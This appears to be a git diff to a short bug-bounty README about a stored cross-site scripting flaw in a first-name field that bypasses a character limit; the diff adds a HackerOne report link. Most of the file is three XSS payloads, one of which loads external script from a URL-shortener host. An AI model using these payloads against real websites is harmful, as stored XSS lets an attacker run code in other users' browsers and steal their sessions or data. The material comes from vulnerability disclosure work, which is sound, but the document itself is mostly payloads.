@@ -1,5 +1,8 @@
 # -hack1chall
 STORED XSS in frist name on page notification bypass limit character
+
+HackerOne : https://hackerone.com/reports/1032059
+
 `<script src=//cutt.ly/s-></script>`
 `<script src=url.js/>` 
 `<svg onload=alert(1) />` 
